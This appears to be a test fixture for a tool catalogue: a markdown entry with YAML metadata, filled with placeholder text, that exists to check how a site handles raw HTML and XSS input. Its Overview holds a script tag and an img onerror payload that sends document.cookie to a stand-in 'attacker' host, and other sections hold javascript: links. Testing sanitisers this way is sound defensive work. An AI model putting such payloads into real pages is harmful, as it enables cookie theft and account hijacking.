---
id: xss-sample
name: XSS Test
type: framework
category: agents
subcategory: agent-frameworks
description: Entry that contains raw HTML / XSS payloads
github_url: https://github.com/example/xss
license: MIT
primary_language: Python
tags:
  - agents
maturity: production
cost_model: open-source
github_stars: 0
trending_score: 0
last_commit: '2026-06-13'
added_date: '2026-06-13'
last_reviewed: '2026-06-13'
added_by: tester
status: active
---

## Overview

<script>alert('xss')</script><img src=x onerror="fetch('https://attacker/?'+document.cookie)">

## Why It's in the Arsenal

<a href="javascript:alert(1)">click me</a>

## Key Features

- feature

## Architecture / How It Works

[click](javascript:alert('xss'))

## Getting Started

```
echo hi
```

## Use Cases

1. sample

## Strengths

- strength

## Limitations / When NOT to Use

- limitation

## Integration Patterns

Sample.

## Resources

- [Link](https://example.com)

## Buzz & Reception

Sample.
